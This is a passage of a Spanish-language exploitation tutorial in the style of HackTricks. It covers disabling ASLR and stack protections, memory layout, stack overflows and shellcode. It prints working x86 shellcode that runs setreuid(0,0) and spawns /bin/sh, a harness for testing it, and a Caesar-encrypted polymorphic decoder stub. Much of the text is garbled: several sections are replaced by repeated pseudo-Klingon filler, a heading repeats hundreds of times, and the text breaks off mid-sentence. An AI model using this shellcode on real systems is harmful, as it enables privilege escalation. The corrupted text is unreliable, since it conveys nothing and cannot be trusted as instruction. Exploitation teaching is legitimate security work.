# Linux Exploiting (Basic) (SPA)

## Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **ASLR**

Aleatorizaci√≥n de direcciones

**Desactiva aleatorizacion(ASLR) GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reactivar aletorizacion GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Desactivar para una ejecuci√≥n** (no requiere root):\
setarch \`arch\` -R ./ejemplo argumentos\
setarch \`uname -m\` -R ./ejemplo argumentos

**Desactivar protecci√≥n de ejecuci√≥n en pila**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo

**Core file**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**Text**\
**Data**\
**BSS**\
**Heap**

**Stack**

**Secci√≥n BSS**: Variables globales o est√°ticas sin inicializar
```
static int i;
```
**DATA jImej**: ghItlhmeH ghom oghmeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghommeH ghomme
```
int i = 5;
```
**Secci√≥n TEXT**: Instrucciones del c√≥digo (opcodes)

**Secci√≥n HEAP**: Buffer reservados de forma din√°nima (malloc(), calloc(), realloc() )

**Secci√≥n STACK**: La pila (Argumentos pasados, cadenas de entorno (env), variables locales‚Ä¶)

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Fallo de segmentaci√≥n o violaci√≥n de segmento: Cuando se intenta acceder a una direcci√≥n de memoria que no ha sido asignada al proceso.

Para obtener la direcci√≥n de una funci√≥n dentro de un programa se puede hacer:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Call to sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** ‚Äî> Nos devuelve un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Nos da un ejecutable formado por el c√≥digo ensamblador y podemos sacar los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes

**Comprobar que la shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
### Para ver que las llamadas al sistema se realizan correctamente se debe compilar el programa anterior y las llamadas del sistema deben aparecer en **strace ./PROGRAMA\_COMPILADO**

### A la hora de crear shellcodes se puede realizar un truco. La primera instrucci√≥n es un jump a un call. El call llama al c√≥digo original y adem√°s mete en el stack el EIP. Despu√©s de la instrucci√≥n call hemos metido el string que necesit√°semos, por lo que con ese EIP podemos se√±alar al string y adem√°s continuar ejecutando el c√≥digo.

### EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Qap Stack(/bin/sh) laH:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ FNSTENV:**

**EJ
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter:**

**QI'lop Hut:**

QaStaHvIS pagh memory pages associated to process vItlh shellcode 'ej vItlh (shellcode 'ej pong signature). vItlh cases vaj injection code vItlh chenmoH space, 'ej vItlh.

**Shellcodes polim√≥rficos**

**QI'lop polim√≥rficos:**

QaStaHvIS shells encrypted 'ej vItlh chenmoH code vItlh decrypt 'ej jump to, Call-Pop trick 'oH 'ej 'ej **example encrypted Caesar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **QapHa' 'e' Frame Pointer (EBP)**

QapHa' 'e' chenmoHwI' 'ejDaq vItlhutlh. 'ejwI' 'ejDaq 'e' EBP 'ejDaq 'e' EIP vItlhutlh.

'e' chenmoHwI' qatlh 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' 